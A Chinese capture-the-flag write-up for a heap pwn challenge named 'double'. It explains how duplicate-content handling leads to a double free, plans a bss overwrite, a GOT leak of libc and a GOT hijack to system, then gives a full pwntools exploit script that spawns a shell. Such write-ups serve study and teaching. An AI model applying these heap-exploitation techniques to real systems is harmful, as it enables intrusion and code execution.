# double
这题放的比bms晚几秒...导致我直接上手bms错过了竞争这题的前几血的机会...
这题主要是逆向逆清楚了就知道了...虽然我当时心里急没咋逆清楚就上手了...就是调着调着就出来了

## Analysis
* 存在show但是每次输入被截断
* 没开`pie`,链表结构储存chunk
* 内容相同的话不再创建新的内容chunk而是直接指向#这里我没逆清楚我只知道 空状况下`add(A) add(A) add(B) free(0) free(2) free(1) `造成`double free `不过也够用了
* `edit`里用的是`memncpy`不会被0截断,`add`里面用的是`strncpy`会被截断...这个卡了我好久..一直以为都是`strncpy`

## 思路
* `double free `控制`bss` 盖掉`head_ptr`指向`bss` 上区域(因为我们不知道其他`address`)
* `edit` 上去一个 `fake_chunk` 其中的`ptr`指向`got`用来泄露 
* `show to leak`
* `edit to hijacking`
## exp
```python
from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,data="A"):
	cmd(1)
	p.sendlineafter("data:\n",data.ljust(size,'\x00'))
def show(idx):
	cmd(2)
	p.sendlineafter("dex: ",str(idx))
def edit(idx,c,size):
	cmd(3)
	p.sendlineafter("dex: ",str(idx))
	p.sendline(c.ljust(size,'\x00'))
def free(idx):
	cmd(4)
	p.sendlineafter("dex: ",str(idx))
p=process('./pwn')
#p=remote("39.106.224.151",40002)
add(0x67,'A')#0
add(0x67,"A")#1
add(0x67,'B')#2
add(0x17,'K')#3
free(0)
free(2)
free(1)
free(3)
add(0x67,p64(0x4040bd))
add(0x67,"B")
add(0x67,"C")
add(0x17,"A"*8+p64(0x000000000404018))
add(0x67,"AAA")
edit(0,"AAA"+p64(0x4040e0)*2+p64(0x6700000000)+p64(0x000000000404018),0x67)
show(0)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a914f0-0x7ffff7a0d000)
libc.address=base
#
add(0x17,"/bin/sh")
edit(0,p64(libc.symbols['system']),8)
log.warning(hex(base))
free(1)
p.interactive()#
```